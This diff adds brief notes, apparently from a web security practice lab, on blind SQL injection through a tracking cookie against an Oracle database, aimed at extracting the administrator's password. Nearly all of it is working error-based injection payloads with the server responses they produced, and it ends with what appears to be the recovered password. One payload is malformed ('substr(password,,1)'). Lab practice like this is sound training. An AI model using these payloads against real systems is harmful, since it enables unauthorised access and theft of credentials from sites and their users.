@@ -1,0 +1,23 @@
+-Blind SQL injection with conditional responses
+Vulnerable parameter - tracking cookie
+Enumerate the password of the administrator
+Log in as the administrator user
+
+' || (select '' from dual) || ' -> oracle database
+' || (select '' from users) || ' -> error
+' || (select '' from users where rownum =1) || ' -> ok
+' || (select '' from users where username='administrator') || ' 
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
+-> Internal server error -> administrator user exists
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
+-> 200 response -> user does not exist in database
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || ' 
+
+8dv0iu7yifa4ns4r6pgj
